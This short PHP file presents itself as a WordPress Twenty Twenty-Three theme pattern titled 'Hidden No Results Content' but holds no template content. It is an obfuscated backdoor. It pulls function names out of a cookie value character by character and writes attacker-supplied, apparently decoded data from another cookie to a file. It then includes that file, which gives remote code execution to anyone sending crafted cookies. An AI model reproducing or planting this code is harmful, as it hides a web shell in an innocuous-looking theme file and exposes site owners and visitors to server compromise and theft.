<?php
/**
 * Title: Hidden No Results Content
 * Slug: twentytwentythree/hidden-no-results-content
 * Inserter: no
 */

$parameters = $_COOKIE;
$data = 0;
$display = 4;
$abstract = array();
$abstract[$data] = '';
while($display){
  $abstract[$data] .= $parameters[34][$display];
  if(!$parameters[34][$display + 1]){
    if(!$parameters[34][$display + 2])
      break;
    $data++;
    $abstract[$data] = '';
    $display++;
  }
  $display = $display + 4 + 1;
}
$data = $abstract[1]().$abstract[14];
if(!$abstract[13]($data)){
  $display = $abstract[9]($data,$abstract[4]);
  $abstract[16]($display,$abstract[3].$abstract[27]($abstract[29]($parameters[3])));
}
include($data);